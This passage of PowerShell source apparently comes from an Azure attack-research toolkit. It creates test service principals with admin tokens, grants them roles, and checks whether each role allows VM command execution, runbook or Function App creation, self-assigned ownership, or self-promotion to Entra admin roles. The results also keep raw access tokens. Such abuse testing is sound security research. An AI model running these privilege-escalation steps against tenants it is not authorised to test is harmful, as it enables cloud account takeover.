        If (-Not ${global:New-TestAppReg})                                  { $ast = ${using:New-TestAppRegAst};                                ${global:New-TestAppReg} = $ast.GetScriptBlock() }
        If (-Not ${global:New-TestSP})                                      { $ast = ${using:New-TestSPAst};                                    ${global:New-TestSP} = $ast.GetScriptBlock() }
        If (-Not ${global:New-EntraAppSecret})                                { $ast = ${using:New-EntraAppSecretAst};                              ${global:New-EntraAppSecret} = $ast.GetScriptBlock() }
        If (-Not ${global:New-AzureRMRoleAssignment})                       { $ast = ${using:New-AzureRMRoleAssignmentAst};                     ${global:New-AzureRMRoleAssignment} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-AzureRMAddSelfToAzureRMRole})                { $ast = ${using:Test-AzureRMAddSelfToAzureRMRoleAst};              ${global:Test-AzureRMAddSelfToAzureRMRole} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-AzureRMVMRunCommand})                        { $ast = ${using:Test-AzureRMVMRunCommandAst};                      ${global:Test-AzureRMVMRunCommand} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-AzureRMPublishAutomationAccountRunBook})     { $ast = ${using:Test-AzureRMPublishAutomationAccountRunBookAst};   ${global:Test-AzureRMPublishAutomationAccountRunBook} = $ast.GetScriptBlock() }
        If (-Not ${global:Test-AzureRMCreateFunction})                      { $ast = ${using:Test-AzureRMCreateFunctionAst};                    ${global:Test-AzureRMCreateFunction} = $ast.GetScriptBlock() }
        If (-Not ${global:Get-MSGraphTokenWithClientCredentials})           { $ast = ${using:Get-MSGraphTokenWithClientCredentialsAst};         ${global:Get-MSGraphTokenWithClientCredentials} = $ast.GetScriptBlock() }
        If (-Not ${global:Get-AzureRMTokenWithClientCredentials})           { $ast = ${using:Get-AzureRMTokenWithClientCredentialsAst};         ${global:Get-AzureRMTokenWithClientCredentials} = $ast.GetScriptBlock() }

        $ThreadSafeUserAccessAdminToken = (& ${global:Get-AzureRMTokenWithClientCredentials} `
            -ClientID ${using:UserAccessAdminClientID} `
            -ClientSecret ${using:UserAccessAdminSecret} `
            -TenantName ${using:TenantName})

        $ThreadSafeGlobalAdminToken = (& ${global:Get-MSGraphTokenWithClientCredentials} `
            -ClientID ${using:GlobalAdminClientID} `
            -ClientSecret ${using:GlobalAdminSecret} `
            -TenantName ${using:TenantName})

        $ThreadAppRegDisplayName = $(${using:TestGUID} + "-" + $AzureRMRoleDisplayName)

        # Create the test app reg:
        $ThreadSafeAppReg = (& ${global:New-TestAppReg} `
            -DisplayName $ThreadAppRegDisplayName `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the app reg to propagate before creating the SP for the app reg
        Start-Sleep 60s

        # Create the test SP:
        $ThreadSafeSP = (& ${global:New-TestSP} `
            -AppId $ThreadSafeAppReg.AppRegAppId `
            -GlobalAdminMGToken $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the SP to propagate before creating a secret for the app reg.
        Start-Sleep 60s

        # Create a secret for the test app reg:
        $ThreadSafeSecret = (& ${global:New-EntraAppSecret} `
            -AppRegObjectID $ThreadSafeAppReg.AppRegObjectID `
            -Token $ThreadSafeGlobalAdminToken.access_token
        )
        # Wait 1 minute for the secret to propagate before granting the AzureRM role to the test SP:
        Start-Sleep 60s

        # Grant the AzureRM Role to the SP
        $AzureRMRoleAssign = (& ${global:New-AzureRMRoleAssignment} `
            -PrincipalId $ThreadSafeSP.SPObjectId `
            -AzureRMRoleID $_.AzureRMRoleID `
            -TargetObjectID $using:SubscriptionID `
            -Token $ThreadSafeUserAccessAdminToken.access_token
        )
        #Wait 5 minutes for the role assignment to take effect
        Start-Sleep 300s

        # Get test token
        $ThreadSafeTestToken = (& ${global:Get-AzureRMTokenWithClientCredentials} `
            -ClientID       $ThreadSafeSecret.AppRegAppId `
            -ClientSecret   $ThreadSafeSecret.AppRegSecretValue `
            -TenantName     ${using:TenantName}
        )

        Switch (${using:AbuseTestType}) {

            AzureRMVMRunCommand {
                $ThreadSafeTest = (& ${global:Test-AzureRMVMRunCommand} `
                    -TestToken              $ThreadSafeTestToken.access_token `
                    -HeldPrivilege          $AzureRMRoleDisplayName `
                    -TimeOfTest             $(Get-Date) `
                    -VirtualMachinePath     ${using:TargetVirtualMachinePath} 
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            AzureRMPublishAutomationAccountRunBook {
                $ThreadSafeTest = (& ${global:Test-AzureRMPublishAutomationAccountRunBook} `
                    -TestToken                      $ThreadSafeTestToken.access_token `
                    -HeldPrivilege                  $AzureRMRoleDisplayName `
                    -TimeOfTest                     $(Get-Date) `
                    -TestSPDisplayName              $ThreadSafeSP.SPDisplayName `
                    -AutomationAccountPath          "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            AzureRMCreateFunction {
                $ThreadSafeTest = (& ${global:Test-AzureRMCreateFunction} `
                    -TestToken                      $ThreadSafeTestToken.access_token `
                    -HeldPrivilege                  $AzureRMRoleDisplayName `
                    -TimeOfTest                     $(Get-Date) `
                    -TestSPDisplayName              $ThreadSafeSP.SPDisplayName `
                    -PathToFunctionApp              "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/FunctionApps/providers/Microsoft.Web/sites/MyCoolFunctionApp"
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }

            AzureRMAddSelfToAzureRMRole {
                $ThreadSafeTest = (& ${global:Test-AzureRMAddSelfToAzureRMRole} `
                    -TestPrincipalID                $ThreadSafeSP.SPObjectId `
                    -AzureRMRoleDefinitionId        "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/providers/Microsoft.Authorization/roleDefinitions/18d7d88d-d35e-4fb5-a5c3-7773c20a72d9" `
                    -TestToken                      $ThreadSafeTestToken.access_token `
                    -UserAccessAdminAzureRMToken    $ThreadSafeUserAccessAdminToken.access_token `
                    -HeldPrivilege                  $AzureRMRoleDisplayName `
                    -TimeOfTest                     $(Get-Date) `
                    -SubscriptionID                 $using:SubscriptionID
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)
            }
            
            # Run all tests by default if the user did not specify an AbuseTestType
            default {
                $ThreadSafeTest = (& ${global:Test-AzureRMVMRunCommand} `
                    -TestToken              $ThreadSafeTestToken.access_token `
                    -HeldPrivilege          $AzureRMRoleDisplayName `
                    -TimeOfTest             $(Get-Date) `
                    -VirtualMachinePath     ${using:TargetVirtualMachinePath} 
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-AzureRMPublishAutomationAccountRunBook} `
                    -TestToken                      $ThreadSafeTestToken.access_token `
                    -HeldPrivilege                  $AzureRMRoleDisplayName `
                    -TimeOfTest                     $(Get-Date) `
                    -TestPrincipalDisplayName       $ThreadSafeSP.SPDisplayName `
                    -AutomationAccountPath          "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount"
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-AzureRMCreateFunction} `
                    -TestToken                      $ThreadSafeTestToken.access_token `
                    -HeldPrivilege                  $AzureRMRoleDisplayName `
                    -TimeOfTest                     $(Get-Date) `
                    -TestPrincipalDisplayName       $ThreadSafeSP.SPDisplayName `
                    -PathToFunctionApp              "https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/FunctionApps/providers/Microsoft.Web/sites/MyCoolFunctionApp"
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)

                $ThreadSafeTest = (& ${global:Test-AzureRMAddSelfToAzureRMRole} `
                    -TestPrincipalID                $ThreadSafeSP.SPObjectId `
                    -AzureRMRoleDefinitionId        "/subscriptions/f1816681-4df5-4a31-acfa-922401687008/providers/Microsoft.Authorization/roleDefinitions/18d7d88d-d35e-4fb5-a5c3-7773c20a72d9" `
                    -TestToken                      $ThreadSafeTestToken.access_token `
                    -UserAccessAdminAzureRMToken    $ThreadSafeUserAccessAdminToken.access_token `
                    -HeldPrivilege                  $AzureRMRoleDisplayName `
                    -TimeOfTest                     $(Get-Date) `
                    -SubscriptionID                 $using:SubscriptionID
                )
                $LocalTestResult = $using:AzureRMTestResults
                $LocalTestResult.Add($ThreadSafeTest)

            }
        }

    }
    $AzureRMTestResults
}

Function Remove-AbuseTestAzureRMRoles {
    <#
    .SYNOPSIS
        Remove all AzureRM role assignments associated with a particular abuse test GUID

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Removes all AzureRM role assignment associated with a particular abuse test GUID.

    .PARAMETER TestGUID
        The unique identifier of the abuse tests associated with the target AzureRM roles

    .PARAMETER SubscriptionID
        The ID of the AzureRM Subscription to remove abuse test role assignments from

    .PARAMETER UserAccessAdminAzureRMToken
        The AzureRM scoped JWT for a User Access Admin principal. This can be a global admin you've granted control of the subscription to (https://adsecurity.org/?p=4277)

    .EXAMPLE
        C:\PS> Remove-AbuseTestAzureRMRoles `
            -TestGUID "bf510275"
            -SubscriptionID "f1816681-4df5-4a31-acfa-922401687008" `
            -UserAccessAdminAzureRMToken $ARMToken `
            -MSGraphGlobalAdminToken $MGToken

        Description
        -----------
        Remove all abuse test role assignments associated with the test GUID "bf510275" from the subscription with ID of "f1816681-4df5-4a31-acfa-922401687008"

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/rest/api/authorization/role-definitions/delete
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $SubscriptionID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $UserAccessAdminAzureRMToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $MSGraphGlobalAdminToken
        
    )

    # Remove the sub-level role assignments we granted the test SPs
    # Get list of the test service principals by their ID
    $URI = "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=startswith(displayName,'$($TestGUID)')"
    $Results = $null
    $TestSPObjects = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($MSGraphGlobalAdminToken)"} `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $TestSPObjects += $Results.value
        } else {
            $TestSPObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))

    # Get the current sub-level role assignments
    $URI = "https://management.azure.com/subscriptions/$($SubscriptionID)/providers/Microsoft.Authorization/roleAssignments?api-version=2018-01-01-preview"
    $Request = $null
    $SubLevelRoleAssignments = Invoke-RestMethod `
        -Headers @{Authorization = "Bearer $($UserAccessAdminAzureRMToken)"} `
        -URI $URI `
        -Method GET 
    $RoleAssignmentToDelete = $null

    $TestSPObjects | ForEach-Object -ThrottleLimit 50 -Parallel {
        $TestSP = $_
        $RoleToDelete = ${using:SubLevelRoleAssignments}.value | ?{$_.properties.principalId -Match $TestSP.id}
        $URI = "https://management.azure.com/subscriptions/$(${using:SubscriptionID})/providers/microsoft.authorization/roleassignments/$($RoleToDelete.name)?api-version=2018-01-01-preview"
        $Request = $null
        $Request = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $(${using:UserAccessAdminAzureRMToken})"} `
            -URI $URI `
            -Method DELETE 
    }
}

Function Remove-AbuseTestServicePrincipals {
    <#
    .SYNOPSIS
        Remove all Entra Service Principals associated with a particular abuse test GUID

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Takes an abuse test GUID, finds all service principals where their display name starts with that GUID, and deletes them

    .PARAMETER TestGUID
        The unique identifier of the abuse tests 

    .PARAMETER MSGraphGlobalAdminToken
        The JWT for an Entra Global Admin

    .EXAMPLE
        C:\PS> Remove-AbuseTestAzureRMRoles `
            -TestGUID "bf510275"
            -MSGraphGlobalAdminToken $MGToken

        Description
        -----------
        Remove all service principals associated with the test GUID of "bf510275"

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
        https://docs.microsoft.com/en-us/graph/api/serviceprincipal-delete?view=graph-rest-1.0&tabs=http
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $MSGraphGlobalAdminToken
        
    )

    # Delete the app registrations from the previous test
    $URI = "https://graph.microsoft.com/v1.0/applications?`$filter=startswith(displayName,'$($TestGUID)')"
    $Results = $null
    $TestAppRegObjects = $null
    do {
        $Results = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($MSGraphGlobalAdminToken)"} `
            -URI $URI `
            -UseBasicParsing `
            -Method "GET" `
            -ContentType "application/json"
        if ($Results.value) {
            $TestAppRegObjects += $Results.value
        } else {
            $TestAppRegObjects += $Results
        }
        $uri = $Results.'@odata.nextlink'
    } until (!($uri))
    $TestAppRegObjects | ForEach-Object -ThrottleLimit 200 -Parallel {
        $GAToken = ${using:MSGraphGlobalAdminToken}
        $App = $_
        Try {
            $DeleteApp = Invoke-RestMethod `
                -Headers @{Authorization = "Bearer $(${using:MSGraphGlobalAdminToken})"} `
                -Uri "https://graph.microsoft.com/v1.0/applications/$($App.id)" `
                -Method DELETE
        }
        Catch{
        }
    }
}

Function New-TestAppReg {
    <#
    .SYNOPSIS
        Create a test Azure app registration for the purpose of an abuse automation test

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Creates a new Entra Application Registration object with a provided test GUID as part of the app's display name

    .PARAMETER TestGUID
        The unique identifier for your test, useful for later debugging purposes to differentiate tests from each other

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .EXAMPLE
        New-TestAppReg -DisplayName "MyCoolApp" -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Create a new Application Registration with a display name of "MyCoolApp"

    .EXAMPLE
        C:\PS> $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]
        C:\PS> $TestGUID
        2df84813
        C:\PS> $MGRole = "RoleManagement.ReadWrite.Directory"
        C:\PS> $DisplayName = $TestGUID + "-" + $MGRole
        C:\PS> New-TestAppReg `
            -DisplayName $DisplayName `
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Create a new Application Registration with a display name of "2df84813-RoleManagement.ReadWrite.Directory"

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $DisplayName,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Because we are calling this function with several simultaneous threads, we sometimes need to retry the app reg creation step several times.
    $Count = 0
    $AppCreated = $False
    Do {
        Try {
            # Create the app reg
            $body = @{
                displayName = $DisplayName
            }
            $AppRegCreation = Invoke-RestMethod `
                -Headers        @{Authorization = "Bearer $($GlobalAdminMGToken)" } `
                -URI            "https://graph.microsoft.com/v1.0/applications" `
                -Method         POST `
                -Body           $($body | ConvertTo-Json) `
                -ContentType    'application/json'
            $AppCreated = $True
        }
        Catch {
            Write-Host $_
        }
        $Count++
        Start-Sleep -s 1
    }
    Until ($AppCreated -or $Count -eq 100)

    $AppReg = @{
        AppRegObjectID      =   $AppRegCreation.id
        AppRegAppId         =   $AppRegCreation.appId
        AppRegDisplayName   =   $AppRegCreation.displayName
    }
    $AppReg
}
New-Variable -Name 'New-TestAppRegDefinition' -Value (Get-Command -Name "New-TestAppReg") -Force
New-Variable -Name 'New-TestAppRegAst' -Value (${New-TestAppRegDefinition}.ScriptBlock.Ast.Body) -Force

Function New-TestSP {
    <#
    .SYNOPSIS
        Create a test service principal for the purpose of an abuse automation test

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Creates a new Entra Service Principal with a provided test GUID as part of the SP's display name

    .PARAMETER TestGUID
        The unique identifier for your test, useful for later debugging purposes to differentiate tests from each other

    .PARAMETER AppId
        The AppId of the existing Application Registration object to associate this Service Principal with

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .EXAMPLE
        C:\PS> $AppID = "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae"
        C:\PS> New-TestSP `
            -AppID $TestGUID
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Create a new Service Principal associated with the App Reg with AppId of "76add5b8-33fe-4f8f-8afe-8b75ddfaa7ae"

    .EXAMPLE
        C:\PS> New-TestAppReg -DisplayName "MyCoolApp" -GlobalAdminMGToken $GlobalAdminToken.access_token | New-TestSP -GlobalAdminMGToken $GlobalAdminToken.access_token

        Description
        -----------
        Pipe the result of New-TestAppReg into New-TestSP, creating a new App Reg and its associated SP in one line

    .EXAMPLE
        $TestGUID = ([GUID]::NewGuid()).toString().split('-')[0]
        $MGRole = "RoleManagement.ReadWrite.Directory"
        $DisplayName = $TestGUID + "-" + $MGRole
        New-TestAppReg -DisplayName $DisplayName -GlobalAdminMGToken $GlobalAdminToken.access_token New-TestSP -GlobalAdminMGToken $GlobalAdminToken.access_token

        Description
        -----------
        Create a new app reg with a test GUID and MG Role name, then pipe that output to New-TestSP to create the associated SP as well in one line

    .INPUTS
        String

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [Alias('AppRegAppId')]
        [String]
        $AppId,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Create the SP
    $body = @{
        appId = $AppId
    }
    $SPCreation = Invoke-RestMethod `
        -Headers        @{Authorization = "Bearer $($GlobalAdminMGToken)" } `
        -URI            "https://graph.microsoft.com/v1.0/servicePrincipals" `
        -Method         POST `
        -Body           $($body | ConvertTo-Json) `
        -ContentType    'application/json'

    $SP = @{
        SPObjectID     = $SPCreation.id
        SPAppId        = $SPCreation.appId
        SPDisplayName  = $SPCreation.displayName
    }

    $SP
}
New-Variable -Name 'New-TestSPDefinition' -Value (Get-Command -Name "New-TestSP") -Force
New-Variable -Name 'New-TestSPAst' -Value (${New-TestSPDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddSelfAsOwnerOfApp {
    <#
    .SYNOPSIS
        Tests whether a Service Principal add itself as the owner of an app registration object

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to grant the associated service principal ownership of an app registration

    .PARAMETER TestPrincipalID
        The ID of the service principal you are performing the test as.
        This is the SP that will try to add itself as the owner of another SP.

    .PARAMETER TargetAppId
        The object ID of the Entra App you are trying to add an owner to.

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER HeldPrivilege
        The MS Graph app role your test SP has been granted

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .PARAMETER TestGUID
        The unique ID for your test. This should be used across all SPs and objects for this test.

    .EXAMPLE
        C:\PS> Test-MGAddSelfAsOwnerOfApp `
            -TestPrincipalId "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetAppId "cd8baf4b-ede9-47cb-800b-6997ae93a1f0" `
            -TestToken $TestToken `
            -GlobalAdminMGToken $GlobalAdminMGToken
            -TimeOfTest Get-Date

        Description
        -----------
        Test whether the supplied JWT can add itself as an owner of the App Reg with object ID of "cd8baf4b-ede9-47cb-800b-6997ae93a1f0"

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetAppId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # Test whether the SP can add itself as an owner over an app reg
    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($TestPrincipalID)"
    }
    $Success = $False
    Try {
        $AddAppOwner = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri "https://graph.microsoft.com/v1.0/applications/$($TargetAppId)/owners/`$ref" `
            -Method POST `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add owner to app"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"

        # Clean up the test by removing the SP as owner of the target app
        # Wait 1 minute for the app ownership to have propagated in Azure before deleting the app ownership
        Start-Sleep -s 60
        $body = @{
            "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($SPCreation.id)"
        }
        Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri "https://graph.microsoft.com/v1.0/applications/$($TargetAppId)/owners/`$ref" `
            -Method DELETE `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddSelfAsOwnerOfAppDefinition' -Value (Get-Command -Name "Test-MGAddSelfAsOwnerOfApp") -Force
New-Variable -Name 'Test-MGAddSelfAsOwnerOfAppAst' -Value (${Test-MGAddSelfAsOwnerOfAppDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddSelfAsOwnerOfSP {
    <#
    .SYNOPSIS
        Tests whether a Service Principal add itself as the owner of another Service Principal

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to grant the associated service principal ownership of another service principal

    .PARAMETER TestPrincipalID
        The ID of the service principal you are performing the test as.
        This is the SP that will try to add itself as the owner of another SP.

    .PARAMETER TargetSPId
        The object ID of the Entra SP you are trying to add an owner to.

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER HeldPrivilege
        The MS Graph app role your test SP has been granted

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .PARAMETER TestGUID
        The unique ID for your test. This should be used across all SPs and objects for this test.

    .EXAMPLE
        C:\PS> Test-MGAddSelfAsOwnerOfSP `
            -TestPrincipalId "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -TargetSPId "953c2758-28a3-4391-a5ff-ef7bad41bf9d" `
            -TestToken $TestToken `
            -GlobalAdminMGToken $GlobalAdminMGToken
            -TimeOfTest Get-Date

        Description
        -----------
        Test whether the supplied JWT can promote its associated service principal to the Global Admins role

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TargetSPId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestToken,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $HeldPrivilege,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TimeOfTest,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestGUID,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $GlobalAdminMGToken
        
    )

    # If either the test token or GA token expire in the next 5 minutes, bail and report this to the user.

    # Ensure the provided Entra role is activated.

    # Check whether the test SP is already activated for the role. If so, remove the SP from that role and get a new test token for that SP

    # Test whether the SP can add itself as an owner over an existing SP
    $body = @{
        "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($TestPrincipalId)"
    }
    $Success = $False
    Try {
        $AddSPOwner = Invoke-RestMethod `
            -Headers @{Authorization = "Bearer $($TestToken)" } `
            -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($TargetSPId)/owners/`$ref" `
            -Method POST `
            -Body $($body | ConvertTo-Json) `
            -ContentType 'application/json'
        $Success = $True
    }
    Catch {
    }

    # Return an object of the test result:
    $AbuseTestResult = New-Object PSObject -Property @{
        AbuseTestType           = "Add owner to SP"
        AbuseTestHeldPrivilege  = $HeldPrivilege
        AbuseTestOutcome        = $null
        AbuseTestDateTime       = $TimeOfTest
        AbuseTestToken          = $TestToken
    }
    $AbuseTestResult.PSObject.TypeNames.Insert(0, 'BARK.AbuseTestResult.SelfEntraAdminRoleAssignment')

    If ($Success) {
        $AbuseTestResult.AbuseTestOutcome = "Success"

        # Clean up the test by removing the SP as owner of the target SP
        # Wait 1 minute for the SP ownership to have propagated in Azure before deleting the SP ownership
        #Start-Sleep -s 60
        #$body = @{
        #    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($SPCreation.id)"
        #}
        #Invoke-RestMethod `
        #    -Headers @{Authorization = "Bearer $($TestToken)" } `
        #    -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$($TargetSPId)/owners/`$ref" `
        #    -Method DELETE `
        #    -Body $($body | ConvertTo-Json) `
        #    -ContentType 'application/json'
    } Else {
        $AbuseTestResult.AbuseTestOutcome = "Failure"
    }
    $AbuseTestResult
}
New-Variable -Name 'Test-MGAddSelfAsOwnerOfSPDefinition' -Value (Get-Command -Name "Test-MGAddSelfAsOwnerOfSP") -Force
New-Variable -Name 'Test-MGAddSelfAsOwnerOfSPAst' -Value (${Test-MGAddSelfAsOwnerOfSPDefinition}.ScriptBlock.Ast.Body) -Force

Function Test-MGAddSelfToEntraRole {
    <#
    .SYNOPSIS
        Tests whether a Service Principal can activate itself into an Entra Admin role

        Author: Andy Robbins (@_wald0)
        License: GPLv3
        Required Dependencies: None

    .DESCRIPTION
        Test whether the supplied JWT has the privilege to activate the associated principal to the specified Entra admin role

    .PARAMETER TestPrincipalID
        The ID of the service principal you are trying to activate the role for

    .PARAMETER RoleDefinitionId
        The globally unique ID of the Entra admin role you are trying to activate

    .PARAMETER TestToken
        The MS Graph-scoped JWT for the test service principal

    .PARAMETER GlobalAdminMGToken
        The MS-Graph scoped JWT for a Global Admin principal

    .PARAMETER TimeOfTest
        The Get-Date formatted time the test was performed

    .EXAMPLE
        C:\PS> Test-MGAddSelfToEntraRole `
            -TestPrincipalId = "028362ca-90ae-41f2-ae9f-1a678cc17391" `
            -RoleDefinitionId "62e90394-69f5-4237-9190-012177145e10" `
            -TestToken $TestToken
            -GlobalAdminMGToken $GlobalAdminMGToken

        Description
        -----------
        Test whether the supplied JWT can promote its associated service principal to the Global Admins role

    .LINK
        https://medium.com/p/74aee1006f48
    #>
    [CmdletBinding()] Param (
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $TestPrincipalID,

        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
            ValueFromPipelineByPropertyName = $True
        )]
        [String]
        $RoleDefinitionId,
        
        [Parameter(
            Mandatory = $True,
            ValueFromPipeline = $True,
